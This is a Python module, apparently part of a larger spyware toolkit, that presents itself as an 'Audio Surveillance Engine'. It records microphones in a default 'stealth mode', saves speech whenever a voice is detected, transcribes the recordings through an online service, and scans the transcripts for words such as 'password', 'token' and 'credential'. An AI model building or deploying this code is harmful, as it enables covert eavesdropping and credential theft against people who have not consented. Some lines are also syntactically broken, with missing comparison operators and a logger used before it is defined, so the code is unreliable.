#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
microphone_controller.py - Advanced Microphone Control and Audio Surveillance
Record, analyze, and manipulate microphone audio
"""

import os
import sys
import time
import threading
import queue
import json
import base64
import hashlib
import wave
import struct
import math
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
from dataclasses import dataclass, asdict
from enum import Enum
import warnings

# Try to import audio libraries
try:
    import pyaudio
    import numpy as np
    PYAUDIO_AVAILABLE = True
except ImportError:
    PYAUDIO_AVAILABLE = False
    logger.warning("PyAudio not available, microphone functionality limited", module="microphone_controller")

try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False

try:
    from scipy import signal
    SCIPY_AVAILABLE = True
except ImportError:
    SCIPY_AVAILABLE = False

# Import utilities
from ..utils.logger import get_logger
from ..utils.encryption import AES256Manager
from ..utils.obfuscation import ObfuscationManager
from ..security.audit_log import get_audit_log_manager, AuditEventType, AuditSeverity

logger = get_logger()
audit_log = get_audit_log_manager()

class AudioMode(Enum):
    """Audio operation modes"""
    RECORD = "record"
    STREAM = "stream"
    ANALYZE = "analyze"
    TRANSCRIBE = "transcribe"
    KEYWORD_DETECT = "keyword_detect"
    VOICE_ACTIVATION = "voice_activation"
    AUDIO_INJECTION = "audio_injection"

class AudioQuality(Enum):
    """Audio quality settings"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    ULTRA = "ultra"

@dataclass
class AudioDevice:
    """Audio device information"""
    index: int
    name: str
    channels: int = 1
    sample_rate: int = 44100
    sample_width: int = 2  # bytes
    available: bool = True
    max_input_channels: int = 1
    
    def __post_init__(self):
        pass
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        data = asdict(self)
        return data

@dataclass
class AudioCapture:
    """Audio capture configuration"""
    mode: AudioMode
    device: AudioDevice
    duration: float = 0.0  # 0 = continuous
    quality: AudioQuality = AudioQuality.MEDIUM
    output_path: Optional[str] = None
    stream_url: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        data = asdict(self)
        data['mode'] = self.mode.value
        data['quality'] = self.quality.value
        data['device'] = self.device.to_dict()
        return data

class AudioAnalysis:
    """Audio analysis results"""
    
    def __init__(self):
        self.rms = 0.0
        self.db = 0.0
        self.freq_dominant = 0.0
        self.freq_bandwidth = 0.0
        self.silence_duration = 0.0
        self.speech_probability = 0.0
        self.keywords_found = []
        self.transcription = ""
        self.timestamp = datetime.now()
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'rms': self.rms,
            'db': self.db,
            'freq_dominant': self.freq_dominant,
            'freq_bandwidth': self.freq_bandwidth,
            'silence_duration': self.silence_duration,
            'speech_probability': self.speech_probability,
            'keywords_found': self.keywords_found,
            'transcription': self.transcription,
            'timestamp': self.timestamp.isoformat()
        }

class MicrophoneController:
    """Advanced Microphone Control and Audio Surveillance Engine"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Configuration
        self.default_sample_rate = self.config.get('default_sample_rate', 44100)
        self.default_channels = self.config.get('default_channels', 1)
        self.default_chunk_size = self.config.get('default_chunk_size', 1024)
        self.record_dir = self.config.get('record_dir', '/tmp/audio_recordings')
        self.analysis_dir = self.config.get('analysis_dir', '/tmp/audio_analysis')
        self.stream_port = self.config.get('stream_port', 8082)
        self.stealth_mode = self.config.get('stealth_mode', True)
        
        # Keyword database for detection
        self.keywords = self.config.get('keywords', [
            'password', 'secret', 'confidential', 'login', 'admin',
            'root', 'access', 'key', 'token', 'credential'
        ])
        
        # Audio devices
        self.devices = {}
        self.active_captures = {}
        
        # PyAudio availability
        self.pyaudio_available = PYAUDIO_AVAILABLE
        
        # Speech recognition availability
        self.speech_recognition_available = SPEECH_RECOGNITION_AVAILABLE
        
        # Audio analysis queue
        self.audio_queue = queue.Queue()
        
        # Statistics
        self.stats = {
            'recordings_made': 0,
            'streams_started': 0,
            'analyses_performed': 0,
            'transcriptions_made': 0,
            'keywords_detected': 0,
            'voice_activations': 0,
            'bytes_recorded': 0,
            'start_time': datetime.now()
        }
        
        # Create directories
        os.makedirs(self.record_dir, exist_ok=True)
        os.makedirs(self.analysis_dir, exist_ok=True)
        
        # Auto-detect audio devices
        if self.pyaudio_available:
            self.detect_audio_devices()
        
        logger.info("Microphone Controller initialized", module="microphone_controller")
    
    def detect_audio_devices(self) -> List[AudioDevice]:
        """Detect available audio input devices"""
        devices = []
        
        if not self.pyaudio_available:
            logger.warning("PyAudio not available, audio device detection limited", 
                         module="microphone_controller")
            return devices
        
        try:
            logger.info("Detecting audio input devices...", module="microphone_controller")
            
            p = pyaudio.PyAudio()
            
            # Get device count
            device_count = p.get_device_count()
            
            for i in range(device_count):
                try:
                    device_info = p.get_device_info_by_index(i)
                    
                    # Check if device has input channels
                    max_input_channels = device_info.get('maxInputChannels', 0)
                    
                    if max_input_channels > 0:
                        device = AudioDevice(
                            index=i,
                            name=device_info.get('name', f'Audio Device {i}'),
                            channels=min(self.default_channels, max_input_channels),
                            sample_rate=int(device_info.get('defaultSampleRate', self.default_sample_rate)),
                            sample_width=2,  # Default 16-bit
                            available=True,
                            max_input_channels=max_input_channels
                        )
                        
                        devices.append(device)
                        
                        logger.debug(f"Found audio device: {device.name} at index {i}", 
                                   module="microphone_controller")
                        
                except Exception as e:
                    logger.debug(f"Device index {i} failed: {e}", module="microphone_controller")
                    continue
            
            p.terminate()
        
        except Exception as e:
            logger.error(f"Audio device detection error: {e}", module="microphone_controller")
        
        # Update device cache
        for device in devices:
            self.devices[device.index] = device
        
        logger.info(f"Found {len(devices)} audio input devices", module="microphone_controller")
        return devices
    
    def record_audio(self, device_index: int = 0, duration: float = 10.0,
                    quality: AudioQuality = AudioQuality.MEDIUM) -> Optional[str]:
        """Record audio from microphone"""
        if not self.pyaudio_available:
            logger.error("PyAudio not available", module="microphone_controller")
            return None
        
        try:
            if device_index not in self.devices:
                logger.error(f"Audio device {device_index} not found", module="microphone_controller")
                return None
            
            device = self.devices[device_index]
            
            # Adjust parameters based on quality
            if quality == AudioQuality.LOW:
                sample_rate = 8000
                channels = 1
                sample_width = 1  # 8-bit
            elif quality == AudioQuality.MEDIUM:
                sample_rate = 16000
                channels = 1
                sample_width = 2  # 16-bit
            elif quality == AudioQuality.HIGH:
                sample_rate = 44100
                channels = 2
                sample_width = 2  # 16-bit
            else:  # ULTRA
                sample_rate = 48000
                channels = 2
                sample_width = 3  # 24-bit
            
            logger.info(f"Recording audio from {device.name} for {duration} seconds...", 
                       module="microphone_controller")
            
            p = pyaudio.PyAudio()
            
            # Open stream
            stream = p.open(
                format=p.get_format_from_width(sample_width),
                channels=channels,
                rate=sample_rate,
                input=True,
                input_device_index=device_index,
                frames_per_buffer=self.default_chunk_size
            )
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"recording_{device_index}_{timestamp}.wav"
            filepath = os.path.join(self.record_dir, filename)
            
            frames = []
            
            # Record for specified duration
            for i in range(0, int(sample_rate / self.default_chunk_size * duration)):
                try:
                    data = stream.read(self.default_chunk_size)
                    frames.append(data)
                except Exception as e:
                    logger.error(f"Read error during recording: {e}", module="microphone_controller")
                    break
            
            # Stop and close stream
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            # Save to WAV file
            wf = wave.open(filepath, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(sample_width)
            wf.setframerate(sample_rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            # Update statistics
            self.stats['recordings_made'] += 1
            if os.path.exists(filepath):
                self.stats['bytes_recorded'] += os.path.getsize(filepath)
            
            # Log audit event
            audit_log.log_event(
                event_type=AuditEventType.AUDIO_RECORDING.value,
                severity=AuditSeverity.MEDIUM.value,
                user='system',
                source_ip='localhost',
                description=f"Audio recorded from {device.name}",
                details={
                    'device_index': device_index,
                    'device_name': device.name,
                    'filepath': filepath,
                    'duration': duration,
                    'quality': quality.value,
                    'sample_rate': sample_rate,
                    'channels': channels,
                    'frames': len(frames)
                },
                resource='microphone_controller',
                action='record_audio'
            )
            
            logger.info(f"Audio recorded: {filepath} ({len(frames)} frames)", 
                       module="microphone_controller")
            
            return filepath
            
        except Exception as e:
            logger.error(f"Audio recording error: {e}", module="microphone_controller")
            return None
    
    def stream_audio(self, device_index: int = 0, 
                    stream_url: str = None) -> Optional[threading.Thread]:
        """Start audio streaming"""
        if not self.pyaudio_available:
            logger.error("PyAudio not available", module="microphone_controller")
            return None
        
        try:
            if device_index not in self.devices:
                logger.error(f"Audio device {device_index} not found", module="microphone_controller")
                return None
            
            device = self.devices[device_index]
            
            # Generate stream URL if not provided
            if not stream_url:
                stream_url = f"http://localhost:{self.stream_port}/audio_{device_index}"
            
            logger.info(f"Starting audio stream from {device.name} to {stream_url}...", 
                       module="microphone_controller")
            
            def audio_stream_thread():
                try:
                    p = pyaudio.PyAudio()
                    
                    stream = p.open(
                        format=pyaudio.paInt16,
                        channels=1,
                        rate=16000,
                        input=True,
                        input_device_index=device_index,
                        frames_per_buffer=self.default_chunk_size
                    )
                    
                    logger.info("Audio streaming started", module="microphone_controller")
                    
                    # Simulate streaming (in real implementation, send to server)
                    while self.active_captures.get(f'stream_{device_index}', False):
                        try:
                            data = stream.read(self.default_chunk_size)
                            # Here you would send data to streaming server
                            # For now, just keep reading
                            
                            # Small delay to prevent CPU overload
                            time.sleep(0.01)
                            
                        except Exception as e:
                            logger.error(f"Stream read error: {e}", module="microphone_controller")
                            break
                    
                    stream.stop_stream()
                    stream.close()
                    p.terminate()
                    
                    logger.info("Audio streaming stopped", module="microphone_controller")
                    
                except Exception as e:
                    logger.error(f"Audio stream thread error: {e}", module="microphone_controller")
            
            # Start streaming thread
            thread = threading.Thread(target=audio_stream_thread, daemon=True)
            self.active_captures[f'stream_{device_index}'] = True
            thread.start()
            
            # Update statistics
            self.stats['streams_started'] += 1
            
            # Log audit event
            audit_log.log_event(
                event_type=AuditEventType.AUDIO_STREAM.value,
                severity=AuditSeverity.MEDIUM.value,
                user='system',
                source_ip='localhost',
                description=f"Audio streaming started from {device.name}",
                details={
                    'device_index': device_index,
                    'device_name': device.name,
                    'stream_url': stream_url
                },
                resource='microphone_controller',
                action='start_stream'
            )
            
            return thread
            
        except Exception as e:
            logger.error(f"Audio stream start error: {e}", module="microphone_controller")
            return None
    
    def stop_stream(self, device_index: int = 0) -> bool:
        """Stop audio streaming"""
        try:
            stream_key = f'stream_{device_index}'
            
            if stream_key in self.active_captures:
                self.active_captures[stream_key] = False
                del self.active_captures[stream_key]
                
                logger.info(f"Stopped audio stream for device {device_index}", 
                           module="microphone_controller")
                return True
            else:
                logger.warning(f"No active audio stream for device {device_index}", 
                             module="microphone_controller")
                return False
            
        except Exception as e:
            logger.error(f"Audio stream stop error: {e}", module="microphone_controller")
            return False
    
    def analyze_audio(self, audio_data: bytes, sample_rate: int = 44100) -> AudioAnalysis:
        """Analyze audio data"""
        analysis = AudioAnalysis()
        
        try:
            if not PYAUDIO_AVAILABLE or not np:
                logger.warning("Audio analysis requires PyAudio and NumPy", 
                             module="microphone_controller")
                return analysis
            
            # Convert bytes to numpy array
            dtype = np.int16
            audio_array = np.frombuffer(audio_data, dtype=dtype).astype(np.float32)
            
            # Calculate RMS (Root Mean Square)
            analysis.rms = np.sqrt(np.mean(np.square(audio_array)))
            
            # Convert RMS to decibels
            if analysis.rms > 0:
                analysis.db = 20 * np.log10(analysis.rms / np.iinfo(dtype).max)
            else:
                analysis.db = -np.inf
            
            # Calculate frequency spectrum if SciPy available
            if SCIPY_AVAILABLE and len(audio_array) > 1024:
                frequencies, power = signal.welch(audio_array, sample_rate, nperseg=1024)
                
                # Find dominant frequency
                dominant_idx = np.argmax(power)
                analysis.freq_dominant = frequencies[dominant_idx]
                
                # Calculate bandwidth (frequency range with significant power)
                threshold = np.max(power) * 0.5  # 50% of max power
                significant_freqs = frequencies[power >= threshold]
                
                if len(significant_freqs) > 1:
                    analysis.freq_bandwidth = significant_freqs[-1] - significant_freqs[0]
            
            # Calculate silence duration (RMS below threshold)
            silence_threshold = np.iinfo(dtype).max * 0.01  # 1% of max amplitude
            
            # Split audio into chunks for silence detection
            chunk_size = sample_rate // 10  # 100ms chunks
            num_chunks = len(audio_array) // chunk_size
            
            silent_chunks = 0
            
            for i in range(num_chunks):
                chunk = audio_array[i*chunk_size:(i+1)*chunk_size]
                chunk_rms = np.sqrt(np.mean(np.square(chunk)))
                
                if chunk_rms < silence_threshold:
                    silent_chunks += 1
            
            analysis.silence_duration = (silent_chunks / num_chunks) * (len(audio_array) / sample_rate)
            
            # Simple speech probability (based on frequency content)
            # Human speech is typically between 85-255 Hz for fundamental frequency
            if analysis.freq_dominant > 85 and analysis.freq_dominant < 400:
                analysis.speech_probability = 0.7
            elif analysis.freq_dominant > 400 and analysis.freq_dominant < 4000:
                analysis.speech_probability = 0.5  # Could be speech harmonics or other sounds
            else:
                analysis.speech_probability = 0.2
            
            # Update statistics
            self.stats['analyses_performed'] += 1
            
            logger.debug(f"Audio analysis complete: RMS={analysis.rms:.2f}, dB={analysis.db:.1f}", 
                       module="microphone_controller")
            
        except Exception as e:
            logger.error(f"Audio analysis error: {e}", module="microphone_controller")
        
        return analysis
    
    def transcribe_audio(self, audio_file: str) -> Optional[str]:
        """Transcribe audio file to text"""
        if not self.speech_recognition_available:
            logger.error("Speech recognition not available", module="microphone_controller")
            return None
        
        try:
            if not os.path.exists(audio_file):
                logger.error(f"Audio file not found: {audio_file}", module="microphone_controller")
                return None
            
            logger.info(f"Transcribing audio file: {audio_file}", module="microphone_controller")
            
            recognizer = sr.Recognizer()
            
            with sr.AudioFile(audio_file) as source:
                # Adjust for ambient noise
                recognizer.adjust_for_ambient_noise(source, duration=0.5)
                
                # Record the audio
                audio_data = recognizer.record(source)
                
                try:
                    # Try Google Speech Recognition (requires internet)
                    transcription = recognizer.recognize_google(audio_data)
                    
                    # Update statistics
                    self.stats['transcriptions_made'] += 1
                    
                    # Log audit event
                    audit_log.log_event(
                        event_type=AuditEventType.AUDIO_TRANSCRIPTION.value,
                        severity=AuditSeverity.MEDIUM.value,
                        user='system',
                        source_ip='localhost',
                        description=f"Audio transcribed from {audio_file}",
                        details={
                            'audio_file': audio_file,
                            'transcription_length': len(transcription),
                            'first_100_chars': transcription[:100] + '...' if len(transcription)100 else transcription
                        },
                        resource='microphone_controller',
                        action='transcribe_audio'
                    )
                    
                    logger.info(f"Transcription complete ({len(transcription)} characters)", 
                               module="microphone_controller")
                    
                    return transcription
                    
                except sr.UnknownValueError:
                    logger.warning("Speech recognition could not understand audio", 
                                 module="microphone_controller")
                    return None
                    
                except sr.RequestError as e:
                    logger.error(f"Speech recognition service error: {e}", 
                               module="microphone_controller")
                    return None
            
        except Exception as e:
            logger.error(f"Audio transcription error: {e}", module="microphone_controller")
            return None
    
    def detect_keywords(self, audio_file: str) -> List[str]:
        """Detect keywords in audio file"""
        detected_keywords = []
        
        try:
            if not os.path.exists(audio_file):
                logger.error(f"Audio file not found: {audio_file}", module="microphone_controller")
                return detected_keywords
            
            # First transcribe the audio
            transcription = self.transcribe_audio(audio_file)
            
            if transcription:
                transcription_lower = transcription.lower()
                
                # Check for keywords
                for keyword in self.keywords:
                    if keyword.lower() in transcription_lower:
                        detected_keywords.append(keyword)
                
                if detected_keywords:
                    # Update statistics
                    self.stats['keywords_detected'] += len(detected_keywords)
                    
                    # Log audit event
                    audit_log.log_event(
                        event_type=AuditEventType.KEYWORD_DETECTED.value,
                        severity=AuditSeverity.HIGH.value,
                        user='system',
                        source_ip='localhost',
                        description=f"Keywords detected in audio: {audio_file}",
                        details={
                            'audio_file': audio_file,
                            'keywords_found': detected_keywords,
                            'transcription_length': len(transcription)
                        },
                        resource='microphone_controller',
                        action='detect_keywords'
                    )
                    
                    logger.info(f"Keywords detected: {detected_keywords}", 
                               module="microphone_controller")
            
        except Exception as e:
            logger.error(f"Keyword detection error: {e}", module="microphone_controller")
        
        return detected_keywords
    
    def voice_activation_monitor(self, device_index: int = 0, 
                               threshold_db: float = -30.0) -> Optional[threading.Thread]:
        """Start voice activation monitoring"""
        if not self.pyaudio_available:
            logger.error("PyAudio not available", module="microphone_controller")
            return None
        
        try:
            if device_index not in self.devices:
                logger.error(f"Audio device {device_index} not found", module="microphone_controller")
                return None
            
            device = self.devices[device_index]
            
            logger.info(f"Starting voice activation monitoring on {device.name}...", 
                       module="microphone_controller")
            
            def voice_monitor_thread():
                try:
                    p = pyaudio.PyAudio()
                    
                    stream = p.open(
                        format=pyaudio.paInt16,
                        channels=1,
                        rate=16000,
                        input=True,
                        input_device_index=device_index,
                        frames_per_buffer=self.default_chunk_size
                    )
                    
                    logger.info("Voice activation monitoring started", 
                               module="microphone_controller")
                    
                    silence_start_time = None
                    recording_buffer = []
                    is_recording = False
                    
                    while self.active_captures.get(f'voice_{device_index}', False):
                        try:
                            # Read audio chunk
                            data = stream.read(self.default_chunk_size)
                            
                            # Convert to numpy array for analysis
                            audio_array = np.frombuffer(data, dtype=np.int16).astype(np.float32)
                            
                            # Calculate RMS and dB
                            rms = np.sqrt(np.mean(np.square(audio_array)))
                            
                            if rms > 0:
                                db = 20 * np.log10(rms / np.iinfo(np.int16).max)
                            else:
                                db = -np.inf
                            
                            # Voice activation logic
                            if db > threshold_db:
                                # Voice detected
                                if not is_recording:
                                    is_recording = True
                                    silence_start_time = None
                                    recording_buffer = []
                                    logger.debug("Voice detected, starting recording", 
                                               module="microphone_controller")
                                
                                recording_buffer.append(data)
                                
                                # Reset silence timer
                                silence_start_time = None
                                
                            else:
                                # Silence detected
                                if is_recording:
                                    if silence_start_time is None:
                                        silence_start_time = time.time()
                                    elif time.time() - silence_start_time > 2.0:  # 2 seconds of silence
                                        # Stop recording
                                        is_recording = False
                                        
                                        # Save recording if we have enough data
                                        if len(recording_buffer) > 10:  # At least 10 chunks (~0.6 seconds)
                                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                            filename = f"voice_{device_index}_{timestamp}.wav"
                                            filepath = os.path.join(self.record_dir, filename)
                                            
                                            # Save to WAV file
                                            wf = wave.open(filepath, 'wb')
                                            wf.setnchannels(1)
                                            wf.setsampwidth(2)
                                            wf.setframerate(16000)
                                            wf.writeframes(b''.join(recording_buffer))
                                            wf.close()
                                            
                                            # Update statistics
                                            self.stats['voice_activations'] += 1
                                            self.stats['bytes_recorded'] += os.path.getsize(filepath)
                                            
                                            logger.info(f"Voice recording saved: {filepath}", 
                                                       module="microphone_controller")
                                            
                                            # Log audit event
                                            audit_log.log_event(
                                                event_type=AuditEventType.VOICE_ACTIVATION.value,
                                                severity=AuditSeverity.LOW.value,
                                                user='system',
                                                source_ip='localhost',
                                                description=f"Voice activated recording from {device.name}",
                                                details={
                                                    'device_index': device_index,
                                                    'device_name': device.name,
                                                    'filepath': filepath,
                                                    'chunks_recorded': len(recording_buffer),
                                                    'threshold_db': threshold_db
                                                },
                                                resource='microphone_controller',
                                                action='voice_activation'
                                            )
                            
                            # Small delay to prevent CPU overload
                            time.sleep(0.01)
                            
                        except Exception as e:
                            logger.error(f"Voice monitor read error: {e}", 
                                       module="microphone_controller")
                            break
                    
                    stream.stop_stream()
                    stream.close()
                    p.terminate()
                    
                    logger.info("Voice activation monitoring stopped", 
                               module="microphone_controller")
                    
                except Exception as e:
                    logger.error(f"Voice monitor thread error: {e}", 
                               module="microphone_controller")
            
            # Start voice monitor thread
            thread = threading.Thread(target=voice_monitor_thread, daemon=True)
            self.active_captures[f'voice_{device_index}'] = True
            thread.start()
            
            return thread
            
        except Exception as e:
            logger.error(f"Voice monitor start error: {e}", module="microphone_controller")
            return None
    
    def stop_voice_monitor(self, device_index: int = 0) -> bool:
        """Stop voice activation monitoring"""
        try:
            voice_key = f'voice_{device_index}'
            
            if voice_key in self.active_captures:
                self.active_captures[voice_key] = False
                del self.active_captures[voice_key]
                
                logger.info(f"Stopped voice monitoring for device {device_index}", 
                           module="microphone_controller")
                return True
            else:
                logger.warning(f"No active voice monitoring for device {device_index}", 
                             module="microphone_controller")
                return False
            
        except Exception as e:
            logger.error(f"Voice monitor stop error: {e}", module="microphone_controller")
            return False
    
    def inject_audio(self, device_index: int, audio_file: str) -> bool:
        """Inject audio playback (simulate audio output)"""
        try:
            if not os.path.exists(audio_file):
                logger.error(f"Audio file not found: {audio_file}", module="microphone_controller")
                return False
            
            logger.info(f"Injecting audio playback from {audio_file}...", 
                       module="microphone_controller")
            
            # This would require audio output capabilities
            # For now, just log the attempt
            
            logger.warning("Audio injection requires audio output capabilities", 
                         module="microphone_controller")
            
            return False
            
        except Exception as e:
            logger.error(f"Audio injection error: {e}", module="microphone_controller")
            return False
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get microphone controller statistics"""
        uptime = (datetime.now() - self.stats['start_time']).total_seconds()
        
        return {
            **self.stats,
            'uptime_seconds': uptime,
            'uptime_human': str(datetime.utcfromtimestamp(uptime).strftime('%H:%M:%S')),
            'devices_available': len(self.devices),
            'active_captures': len(self.active_captures),
            'pyaudio_available': self.pyaudio_available,
            'speech_recognition_available': self.speech_recognition_available,
            'keywords_count': len(self.keywords),
            'stealth_mode': self.stealth_mode
        }
    
    def export_report(self, format: str = 'json', output_file: str = None) -> Optional[str]:
        """Export microphone control report"""
        try:
            data = {
                'statistics': self.get_statistics(),
                'devices': [d.to_dict() for d in self.devices.values()],
                'active_captures': list(self.active_captures.keys()),
                'keywords': self.keywords,
                'directories': {
                    'record_dir': self.record_dir,
                    'analysis_dir': self.analysis_dir
                },
                'timestamp': datetime.now().isoformat()
            }
            
            if format.lower() == 'json':
                output = json.dumps(data, indent=2)
            
            elif format.lower() == 'text':
                output_lines = []
                output_lines.append("MICROPHONE CONTROL REPORT")
                output_lines.append("=" * 80)
                output_lines.append(f"Generated: {datetime.now().isoformat()}")
                output_lines.append(f"Platform: {sys.platform}")
                output_lines.append(f"PyAudio Available: {self.pyaudio_available}")
                output_lines.append(f"Speech Recognition Available: {self.speech_recognition_available}")
                output_lines.append("")
                
                output_lines.append("DETECTED AUDIO DEVICES:")
                output_lines.append("-" * 40)
                for device in self.devices.values():
                    output_lines.append(f"Index {device.index}: {device.name}")
                    output_lines.append(f"  Channels: {device.channels}")
                    output_lines.append(f"  Sample Rate: {device.sample_rate}")
                    output_lines.append(f"  Available: {device.available}")
                    output_lines.append("")
                
                output_lines.append("ACTIVE CAPTURES:")
                output_lines.append("-" * 40)
                for capture in self.active_captures.keys():
                    output_lines.append(f"  {capture}")
                
                output_lines.append("")
                output_lines.append("KEYWORDS FOR DETECTION:")
                output_lines.append("-" * 40)
                for i, keyword in enumerate(self.keywords[:20]):  # Show first 20 keywords
                    output_lines.append(f"  {i+1}. {keyword}")
                
                if len(self.keywords) > 20:
                    output_lines.append(f"  ... and {len(self.keywords) - 20} more")
                
                output_lines.append("")
                output_lines.append("STATISTICS:")
                output_lines.append("-" * 40)
                stats = self.get_statistics()
                output_lines.append(f"Recordings Made: {stats['recordings_made']}")
                output_lines.append(f"Streams Started: {stats['streams_started']}")
                output_lines.append(f"Analyses Performed: {stats['analyses_performed']}")
                output_lines.append(f"Transcriptions Made: {stats['transcriptions_made']}")
                output_lines.append(f"Keywords Detected: {stats['keywords_detected']}")
                output_lines.append(f"Voice Activations: {stats['voice_activations']}")
                output_lines.append(f"Bytes Recorded: {stats['bytes_recorded']:,}")
                output_lines.append(f"Uptime: {stats['uptime_human']}")
                
                output = '\n'.join(output_lines)
            
            else:
                logger.error(f"Unsupported format: {format}", module="microphone_controller")
                return None
            
            # Write to file if specified
            if output_file:
                with open(output_file, 'w') as f:
                    f.write(output)
                
                logger.info(f"Microphone report exported to {output_file}", 
                           module="microphone_controller")
            
            return output
            
        except Exception as e:
            logger.error(f"Export report error: {e}", module="microphone_controller")
            return None
    
    def __del__(self):
        """Cleanup on deletion"""
        try:
            # Stop all active captures
            for key in list(self.active_captures.keys()):
                self.active_captures[key] = False
            self.active_captures.clear()
        except:
            pass

# Global instance
_microphone_controller = None

def get_microphone_controller(config: Dict = None) -> MicrophoneController:
    """Get or create microphone controller instance"""
    global _microphone_controller
    
    if _microphone_controller is None:
        _microphone_controller = MicrophoneController(config)
    
    return _microphone_controller

if __name__ == "__main__":
    print("Testing Microphone Controller...")
    
    # Test configuration
    config = {
        'default_sample_rate': 44100,
        'default_channels': 1,
        'default_chunk_size': 1024,
        'record_dir': '/tmp/audio_test',
        'analysis_dir': '/tmp/audio_test',
        'stream_port': 8083,
        'stealth_mode': True,
        'keywords': ['test', 'password', 'secret']
    }
    
    mc = get_microphone_controller(config)
    
    print(f"\n1. PyAudio Available: {mc.pyaudio_available}")
    print(f"   Speech Recognition Available: {mc.speech_recognition_available}")
    
    if mc.pyaudio_available:
        print("\n2. Detecting audio devices...")
        devices = mc.detect_audio_devices()
        print(f"Found {len(devices)} audio input devices")
        
        for i, device in enumerate(devices[:3]):  # Show first 3
            print(f"  {i+1}. {device.name}")
            print(f"     Index: {device.index}")
            print(f"     Channels: {device.channels}")
            print(f"     Sample Rate: {device.sample_rate}")
        
        if devices:
            print("\n3. Testing short audio recording (2 seconds)...")
            audio_path = mc.record_audio(0, duration=2)
            if audio_path:
                print(f"   Audio recorded: {audio_path}")
                
                print("\n4. Testing keyword detection...")
                keywords = mc.detect_keywords(audio_path)
                print(f"   Keywords detected: {keywords}")
    
    print("\n5. Getting statistics...")
    stats = mc.get_statistics()
    print(f"Recordings made: {stats['recordings_made']}")
    print(f"Transcriptions made: {stats['transcriptions_made']}")
    print(f"Keywords detected: {stats['keywords_detected']}")
    
    print("\n6. Testing report export...")
    report = mc.export_report('text')
    if report:
        print(report[:500] + "..." if len(report)500 else report)
    
    print("\n✅ Microphone Controller tests completed!")
